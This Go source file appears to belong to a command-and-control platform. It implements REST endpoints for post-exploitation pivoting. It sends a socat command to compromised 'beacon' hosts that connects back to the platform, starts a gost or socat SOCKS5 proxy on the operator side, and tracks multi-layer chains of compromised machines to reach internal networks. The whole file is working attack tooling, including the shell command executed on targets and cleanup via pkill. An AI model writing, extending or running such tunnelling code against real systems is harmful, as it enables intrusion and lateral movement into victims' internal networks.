package server

// c2_tunnel.go — C2 内网穿透（SOCKS5 隧道 + 多层链式转发）：
//   方案：服务端（平台 VM）启 SOCKS5 代理 → 目标机 exec 反弹 socat/chisel
//   客户端连 SOCKS5 → 流量经目标机进入内网（单层/多层）
//
//   POST /api/tools/c2/tunnel/start   启动隧道（服务端 SOCKS5 + 目标端反弹）
//   POST /api/tools/c2/tunnel/stop    停止
//   GET  /api/tools/c2/tunnel/status  状态（SOCKS 端口/活跃隧道/链路）
//   GET  /api/tools/c2/tunnel/chains  多层链路列表
//
// 多层内网场景：
//   第一层：beacon A（DMZ）→ 平台 SOCKS5
//   第二层：beacon B（内网1）→ 通过 A 的隧道到达
//   第三层：beacon C（内网2）→ 通过 A→B 的链式隧道到达
//   前端可视化显示链路拓扑

import (
	"strings"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"sync"
	"time"
)

// TunnelState 隧道全局状态。
type TunnelState struct {
	mu sync.Mutex
	// SOCKS5 服务端
	SocksPort    int    `json:"socks_port"`
	SocksPID     int    `json:"socks_pid"`
	SocksRunning bool   `json:"socks_running"`
	// 活跃隧道（每 beacon 一条）
	Tunnels []TunnelEntry `json:"tunnels"`
}

// TunnelEntry 一条隧道（从某 beacon 反弹到平台）。
type TunnelEntry struct {
	SessionID   string `json:"session_id"`
	Hostname    string `json:"hostname"`
	InternalIP  string `json:"internal_ip"`
	RemotePort  int    `json:"remote_port"`  // 目标机上 socat 监听端口
	Status      string `json:"status"`       // connecting / active / failed
	Chain       []string `json:"chain"`      // 链路路径（多层时 >1）
	CreatedAt   string `json:"created_at"`
}

var tunnelState = &TunnelState{SocksPort: 11080}

// ---- SOCKS5 服务端（平台侧）----

// c2SocksStart 启动 SOCKS5 代理（用 gost 或微内置实现）。
// 内置实现：TCP 转发到目标机 socat（非完整 SOCKS5 协议，简化为端口转发）。
// 完整 SOCKS5 场景建议配 gost：gost -L socks5://:11080
func (s *Server) c2SocksStart(port int) error {
	tunnelState.mu.Lock()
	defer tunnelState.mu.Unlock()
	if tunnelState.SocksRunning {
		return nil // 已在跑
	}
	// 尝试用 gost（功能最全）
	if _, err := exec.LookPath("gost"); err == nil {
		cmd := exec.Command("gost", "-L", fmt.Sprintf("socks5://:%d", port))
		cmd.Stdout = nil
		cmd.Stderr = nil
		if err := cmd.Start(); err != nil {
			return fmt.Errorf("gost 启动失败: %w", err)
		}
		tunnelState.SocksPID = cmd.Process.Pid
		tunnelState.SocksRunning = true
		tunnelState.SocksPort = port
		return nil
	}
	// 退化：用 socat 做端口转发（单层场景够用）
	if _, err := exec.LookPath("socat"); err == nil {
		// socat 监听 SOCKS 端口，转发到第一个活跃隧道的目标端口
		if len(tunnelState.Tunnels) == 0 {
			return fmt.Errorf("无活跃隧道——先向 beacon 下发反弹命令")
		}
		target := fmt.Sprintf("TCP:127.0.0.1:%d", tunnelState.Tunnels[0].RemotePort)
		cmd := exec.Command("socat", fmt.Sprintf("TCP-LISTEN:%d,fork,reuseaddr", port), target)
		cmd.Stdout = nil
		cmd.Stderr = nil
		if err := cmd.Start(); err != nil {
			return fmt.Errorf("socat 启动失败: %w", err)
		}
		tunnelState.SocksPID = cmd.Process.Pid
		tunnelState.SocksRunning = true
		tunnelState.SocksPort = port
		return nil
	}
	return fmt.Errorf("gost 或 socat 未安装（apt install gost 或 socat）")
}

// c2SocksStop 停止 SOCKS5。
func c2SocksStop() {
	tunnelState.mu.Lock()
	defer tunnelState.mu.Unlock()
	if tunnelState.SocksPID > 0 {
		if p, err := os.FindProcess(tunnelState.SocksPID); err == nil {
			_ = p.Kill()
		}
	}
	tunnelState.SocksRunning = false
	tunnelState.SocksPID = 0
}

// ---- 目标端反弹 ----

// c2TunnelDeploy 向 beacon 下发反弹命令（socat 端口转发回平台）。
func (s *Server) c2TunnelDeploy(r *http.Request, sessionID, hostname, internalIP string, remotePort int, parentChain []string) error {
	// 平台 IP（beacon 回连目标）
	platformIP := "127.0.0.1" // 同机场景；跨机时取 request Host
	if host, _, err := net.SplitHostPort(r.RemoteAddr); err == nil {
		// 取本机非 loopback IP
		if addrs, err := net.InterfaceAddrs(); err == nil {
			for _, addr := range addrs {
				if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
					platformIP = ipnet.IP.String()
					break
				}
			}
		}
		_ = host
	}

	// 目标端命令：socat TCP-LISTEN:remotePort,fork,reuseaddr TCP:platformIP:socksPort
	// 这样客户端连 platformIP:socksPort → socat 转发到 remotePort → 目标 socat → 内网
	cmd := fmt.Sprintf("which socat >/dev/null 2>&1 && (socat TCP-LISTEN:%d,fork,reuseaddr TCP:%s:%d &>/dev/null & echo TUNNEL-OK) || echo NO-SOCAT",
		remotePort, platformIP, tunnelState.SocksPort)

	result, err := s.c2ExecAndWait(r, sessionID, cmd)
	if err != nil {
		return fmt.Errorf("执行失败: %w", err)
	}
	if !strings.Contains(result, "TUNNEL-OK") {
		if strings.Contains(result, "NO-SOCAT") {
			return fmt.Errorf("目标机未安装 socat（apt install socat / yum install socat）")
		}
		return fmt.Errorf("隧道建立失败: %s", truncateStr(result, 200))
	}

	// 记录隧道
	chain := append(parentChain, hostname)
	tunnelState.mu.Lock()
	tunnelState.Tunnels = append(tunnelState.Tunnels, TunnelEntry{
		SessionID:  sessionID,
		Hostname:   hostname,
		InternalIP: internalIP,
		RemotePort: remotePort,
		Status:     "active",
		Chain:      chain,
		CreatedAt:  time.Now().Format("15:04:05"),
	})
	tunnelState.mu.Unlock()
	return nil
}

// ---- REST API ----

// POST /api/tools/c2/tunnel/start — 启动隧道。
func (s *Server) c2TunnelStart(w http.ResponseWriter, r *http.Request) {
	var b struct {
		SessionID string `json:"session_id"`
		Hostname  string `json:"hostname"`
		InternalIP string `json:"internal_ip"`
		SocksPort int    `json:"socks_port"` // 可选，默认 11080
		ParentChain []string `json:"parent_chain"` // 多层：上层链路
	}
	if err := json.NewDecoder(r.Body).Decode(&b); err != nil || b.SessionID == "" {
		writeErr(w, 400, "session_id 必填")
		return
	}
	if b.SocksPort <= 0 {
		b.SocksPort = 11080
	}
	remotePort := 13300 + len(tunnelState.Tunnels)*10 // 目标端 socat 端口

	// 1) 先向目标下发 socat（确保目标端就绪）
	if err := s.c2TunnelDeploy(r, b.SessionID, b.Hostname, b.InternalIP, remotePort, b.ParentChain); err != nil {
		writeErr(w, 502, "目标端隧道失败: "+err.Error())
		return
	}

	// 2) 再启动平台侧 SOCKS5（socat 需要 tunnel 存在才能确定转发目标）
	if !tunnelState.SocksRunning {
		if err := s.c2SocksStart(b.SocksPort); err != nil {
			// SOCKS5 失败但目标端已部署——提示手动用 gost
			writeJSON(w, 200, map[string]any{"data": map[string]any{
				"socks_running": false,
				"remote_port": remotePort,
				"tunnels": tunnelState.Tunnels,
				"message": fmt.Sprintf("目标端 socat :%d 已部署。SOCKS5 启动失败(%s)——手动运行: gost -L socks5://:%d", remotePort, err.Error(), b.SocksPort),
			}})
			return
		}
	}

	s.c2Audit(b.SessionID, b.Hostname, "tunnel_start", fmt.Sprintf("socks:%d remote:%d", b.SocksPort, remotePort))

	tunnelState.mu.Lock()
	defer tunnelState.mu.Unlock()
	writeJSON(w, 200, map[string]any{"data": map[string]any{
		"socks_port": tunnelState.SocksPort,
		"socks_running": tunnelState.SocksRunning,
		"remote_port": remotePort,
		"tunnels": tunnelState.Tunnels,
		"message": fmt.Sprintf("SOCKS5 :%d 已启动，目标端 socat :%d 已部署——浏览器/代理工具连 127.0.0.1:%d 即可穿透内网",
			tunnelState.SocksPort, remotePort, tunnelState.SocksPort),
	}})
}

// POST /api/tools/c2/tunnel/stop — 停止全部。
func (s *Server) c2TunnelStop(w http.ResponseWriter, r *http.Request) {
	// 杀目标端 socat
	for _, t := range tunnelState.Tunnels {
		if t.Status == "active" {
			_, _ = s.c2ExecAndWait(r, t.SessionID, fmt.Sprintf("pkill -f 'TCP-LISTEN:%d' 2>/dev/null; echo CLEANED", t.RemotePort))
			s.c2Audit(t.SessionID, t.Hostname, "tunnel_stop", "")
		}
	}
	c2SocksStop()
	tunnelState.Tunnels = nil
	writeJSON(w, 200, map[string]any{"ok": true, "message": "隧道已全部停止"})
}

// GET /api/tools/c2/tunnel/status — 状态。
func (s *Server) c2TunnelStatus(w http.ResponseWriter, r *http.Request) {
	tunnelState.mu.Lock()
	defer tunnelState.mu.Unlock()
	writeJSON(w, 200, map[string]any{"data": tunnelState})
}

// GET /api/tools/c2/tunnel/chains — 多层链路拓扑。
func (s *Server) c2TunnelChains(w http.ResponseWriter, r *http.Request) {
	tunnelState.mu.Lock()
	defer tunnelState.mu.Unlock()
	// 按链路深度排序
	chains := make([]TunnelEntry, len(tunnelState.Tunnels))
	copy(chains, tunnelState.Tunnels)
	writeJSON(w, 200, map[string]any{"data": chains})
}
